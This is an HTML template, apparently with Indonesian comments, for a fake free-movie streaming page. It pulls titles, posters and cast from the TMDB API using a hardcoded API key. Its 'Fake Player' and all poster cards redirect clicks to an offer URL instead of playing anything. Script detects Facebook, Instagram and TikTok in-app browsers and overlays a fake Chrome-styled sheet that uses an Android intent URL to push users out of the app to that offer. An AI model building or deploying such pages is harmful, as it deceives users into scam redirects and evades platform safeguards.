<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch Full Movie Online</title>
    
    <!-- Meta Data Facebook (Fallback) -->
    <meta property="og:type" content="video.movie" />
    <meta property="og:title" content="Watch Full Movie Online" id="og-title" />
    <meta property="og:description" content="Stream the latest movies in HD quality." id="og-desc" />
    <meta property="og:image" content="" id="og-img" />

    <style>
        /* CSS Reset & Variables */
        :root {
            --bg-color: #0b0f19;
            --surface: #151a27;
            --text-main: #f1f5f9;
            --text-muted: #94a3b8;
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            line-height: 1.4;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 8px; /* Jarak luar yang rapat */
            display: flex;
            flex-direction: column;
            gap: 8px; /* Jarak antar widget sangat rapat */
        }

        /* Fake Embed Video Player */
        .player-box {
            position: relative;
            width: 100%;
            padding-top: 56.25%; /* 16:9 Aspect Ratio */
            background-color: #000000; /* Latar belakang hitam */
            border-radius: 4px;
            overflow: hidden;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0,0,0,0.5);
        }

        .player-box img.backdrop {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.45; /* Digelapkan agar latar hitam lebih terasa */
            transition: opacity 0.3s;
        }

        .player-box:hover img.backdrop { opacity: 0.3; }

        .play-btn {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 75px;
            height: 75px;
            background-color: rgba(255, 255, 255, 0.95); /* Tombol Play Putih */
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2;
            transition: transform 0.2s ease, background-color 0.2s;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
        }

        .play-btn::after {
            content: '';
            border-top: 20px solid transparent;
            border-bottom: 20px solid transparent;
            border-left: 28px solid #0b0f19; /* Segitiga tengah gelap */
            margin-left: 8px; 
        }

        .player-box:hover .play-btn {
            transform: translate(-50%, -50%) scale(1.1);
            background-color: #ffffff;
            box-shadow: 0 0 25px rgba(255, 255, 255, 0.5);
        }

        /* Movie Info Section */
        .info-box {
            background-color: var(--surface);
            padding: 12px;
            border-radius: 4px;
        }

        .info-box h1 {
            font-size: 1.4rem;
            margin-bottom: 6px;
            font-weight: 700;
        }

        .info-box .desc {
            font-size: 0.9rem;
            color: var(--text-muted);
            margin-bottom: 8px;
            display: -webkit-box;
            -webkit-line-clamp: 3;
            -webkit-box-orient: vertical;
            overflow: hidden;
        }

        .info-box .cast {
            font-size: 0.85rem;
            color: #cbd5e1;
            font-weight: 500;
        }

        .cast span { color: var(--text-muted); }

        /* Trending Movies Section */
        .related-title {
            font-size: 1.1rem;
            margin: 4px 0;
            padding-left: 6px;
            border-left: 3px solid #ffffff;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(6, 1fr);
            gap: 6px; /* Jarak antar thumbnail sangat rapat */
        }

        .movie-card {
            position: relative;
            aspect-ratio: 2 / 3; /* Format poster 2:3 */
            background-color: var(--surface);
            border-radius: 4px;
            overflow: hidden;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .movie-card:hover {
            transform: translateY(-2px);
        }

        .movie-card img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .movie-card .card-title {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            padding: 24px 6px 6px 6px;
            background: linear-gradient(to top, rgba(0,0,0,0.95) 0%, rgba(0,0,0,0.6) 60%, transparent 100%);
            font-size: 0.75rem;
            font-weight: 600;
            text-align: center;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .grid { grid-template-columns: repeat(3, 1fr); gap: 4px; }
            .info-box h1 { font-size: 1.2rem; }
            .play-btn { width: 55px; height: 55px; }
            .play-btn::after { border-top: 14px solid transparent; border-bottom: 14px solid transparent; border-left: 20px solid #0b0f19; margin-left: 6px;}
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Fake Player -->
        <div class="player-box" onclick="redirectToOffer()">
            <img src="" alt="Backdrop" class="backdrop" id="player-bg">
            <div class="play-btn"></div>
        </div>

        <!-- Movie Info -->
        <div class="info-box">
            <h1 id="movie-title">Loading...</h1>
            <p class="desc" id="movie-desc">Please wait while data is being fetched...</p>
            <div class="cast">Cast: <span id="movie-cast">...</span></div>
        </div>

        <!-- Trending Movies (Ganti dari Related) -->
        <div class="related-title">Trending Today</div>
        <div class="grid" id="related-grid">
            <!-- Thumbnail digenerate via JS -->
        </div>
    </div>

    <script>
        // ==========================================================
        //                       PENGATURAN
        // ==========================================================
        const API_KEY = 'ff4a228b2bde4cea37efcc472696d620'; 
        const TARGET_URL = 'https://spreadpreferencetelevision.com/hhqe0ruxga?key=e3ff974fd2665b1074e29d32efa30da4';
        const MOVIE_ID = ''; // ID Film utama yang diputar (Contoh: Avengers Endgame)
        // ==========================================================

        // Fungsi Redirect saat video/poster di-klik
        function redirectToOffer() {
            window.location.href = TARGET_URL;
        }

        // Script Deteksi Facebook / In-App Browser
        document.addEventListener("DOMContentLoaded", function() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const isInAppBrowser = /FBAN|FBAV|Instagram|TikTok|Line|Twitter|Threads/i.test(ua);
            const isAndroid = /android/i.test(ua);
            const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
            
            if (isInAppBrowser) {
                let parsedUrl;
                try {
                    parsedUrl = new URL(TARGET_URL);
                } catch(e) {
                    parsedUrl = new URL("https://" + TARGET_URL.replace(/^https?:\/\//, ''));
                }
                
                let intentTarget = parsedUrl.host + parsedUrl.pathname + parsedUrl.search;
                let normalHref = parsedUrl.href;
                let fallbackEncoded = encodeURIComponent(normalHref);
                
                let actionHTML = '';
                if (isAndroid) {
                    const intentUrl = `intent://${intentTarget}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${fallbackEncoded};end`;
                    actionHTML = `<a href="${intentUrl}" class="ia-btn primary">Continue</a>`;
                } else if (isIOS) {
                    actionHTML = `<span style="font-size:13px; color:#666; text-align:right; font-weight:600;">Tap <b>...</b> (menu)<br>Open in Safari</span>`;
                } else {
                    actionHTML = `<a href="${normalHref}" class="ia-btn primary">Continue</a>`;
                }
                
                const sheetCSS = `<style>
                    .ia-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.6);z-index:999998;display:flex;align-items:flex-end;justify-content:center}
                    .ia-sheet{width:100%;max-width:600px;background:#fff;border-radius:20px 20px 0 0;padding:25px 20px;font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;box-shadow:0 -4px 15px rgba(0,0,0,0.1);animation:slideUp 0.3s ease-out forwards}
                    @keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
                    .ia-header{text-align:center;font-size:17px;font-weight:700;color:#050505;padding-bottom:15px;border-bottom:1px solid #ced0d4;margin-bottom:20px}
                    .ia-row{display:flex;align-items:center;justify-content:space-between}
                    .ia-left{display:flex;align-items:center;gap:15px}
                    .ia-icon{width:42px;height:42px}
                    .ia-text{font-size:16px;font-weight:600;color:#050505}
                    .ia-btn{background:#e4e6eb;color:#050505;font-size:15px;font-weight:600;padding:10px 24px;border-radius:24px;text-decoration:none;transition:0.2s}
                    .ia-btn.primary{background:#0866ff;color:#fff}
                </style>`;
                
                const sheetHTML = `
                <div class="ia-overlay">
                    <div class="ia-sheet">
                        <div class="ia-header">Open Video in Browser...</div>
                        <div class="ia-row">
                            <div class="ia-left">
                                <svg class="ia-icon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M24 10C16.27 10 10 16.27 10 24C10 31.73 16.27 38 24 38C31.73 38 38 31.73 38 24C38 16.27 31.73 10 24 10ZM24 13.5C28.42 13.5 32.2 16.23 33.72 20H16.24C17.97 16.03 21.84 13.5 24 13.5ZM13.88 26.5C13.62 25.7 13.5 24.87 13.5 24C13.5 22.18 14.04 20.48 14.97 19.06L23.75 34.27C18.66 33.84 14.63 30.64 13.88 26.5ZM24 28.5C21.51 28.5 19.5 26.49 19.5 24C19.5 21.51 21.51 19.5 24 19.5C26.49 19.5 28.5 21.51 28.5 24C28.5 26.49 26.49 28.5 24 28.5ZM24.47 34.48L17.7 22.75H32.48C32.8 24.08 33.15 25.5 33.15 27C33.15 31.06 29.83 34.39 25.7 34.48C25.29 34.49 24.88 34.49 24.47 34.48ZM34.27 24C34.27 25.13 34.07 26.21 33.7 27.21L26.31 14.43C30.93 15.65 34.27 19.45 34.27 24Z" fill="#4285F4"/>
                                    <path d="M24 19.5C21.51 19.5 19.5 21.51 19.5 24C19.5 26.49 21.51 28.5 24 28.5C26.49 28.5 28.5 26.49 28.5 24C28.5 21.51 26.49 19.5 24 19.5Z" fill="#FFFFFF"/>
                                </svg>
                                <span class="ia-text">Chrome / Browser</span>
                            </div>
                            ${actionHTML}
                        </div>
                    </div>
                </div>`;
                
                document.body.style.overflow = 'hidden';
                document.body.insertAdjacentHTML('beforeend', sheetCSS + sheetHTML);
            }
        });

        // Script Ambil Data API Film
        async function loadMovieData() {
            if (API_KEY === 'MASUKKAN_API_KEY_TMDB_ANDA_DISINI') {
                document.getElementById('movie-title').innerText = "API Key TMDB Belum Diisi";
                return;
            }

            try {
                // 1. Fetch Data Film Utama
                const resMovie = await fetch(`https://api.themoviedb.org/3/movie/${MOVIE_ID}?api_key=${API_KEY}&language=en-US`);
                const movie = await resMovie.json();

                // 2. Fetch Data Cast
                const resCast = await fetch(`https://api.themoviedb.org/3/movie/${MOVIE_ID}/credits?api_key=${API_KEY}`);
                const credits = await resCast.json();

                // 3. Fetch Trending Movies Today (MENGGANTIKAN RELATED MOVIES)
                const resTrending = await fetch(`https://api.themoviedb.org/3/trending/movie/day?api_key=${API_KEY}&language=en-US`);
                const trending = await resTrending.json();

                // Update UI: Info Film
                document.getElementById('movie-title').innerText = movie.title;
                document.getElementById('movie-desc').innerText = movie.overview;
                document.getElementById('player-bg').src = `https://image.tmdb.org/t/p/w1280${movie.backdrop_path}`;
                
                // Pemeran Teratas
                const topCast = credits.cast.slice(0, 5).map(c => c.name).join(', ');
                document.getElementById('movie-cast').innerText = topCast;

                // Update Meta Script Dinamis
                document.title = `${movie.title} - Watch Free Online`;
                document.getElementById('og-title').setAttribute('content', movie.title);
                document.getElementById('og-desc').setAttribute('content', movie.overview);
                document.getElementById('og-img').setAttribute('content', `https://image.tmdb.org/t/p/w780${movie.backdrop_path}`);

                // Update UI: Trending Hari Ini (Acak dari daftar trending)
                const grid = document.getElementById('related-grid');
                
                // Ambil daftar trending dan acak
                const shuffledTrending = trending.results.sort(() => 0.5 - Math.random());
                // Pilih 6 teratas setelah diacak
                const selectedTrending = shuffledTrending.slice(0, 6);

                selectedTrending.forEach(item => {
                    if (item.poster_path) {
                        const card = document.createElement('div');
                        card.className = 'movie-card';
                        card.onclick = redirectToOffer;
                        card.innerHTML = `
                            <img src="https://image.tmdb.org/t/p/w342${item.poster_path}" alt="${item.title}" loading="lazy">
                            <div class="card-title">${item.title}</div>
                        `;
                        grid.appendChild(card);
                    }
                });

            } catch (error) {
                console.error("Gagal memuat API:", error);
                document.getElementById('movie-title').innerText = "Movie Not Found / Error";
            }
        }

        window.onload = loadMovieData;
    </script>
</body>
</html>
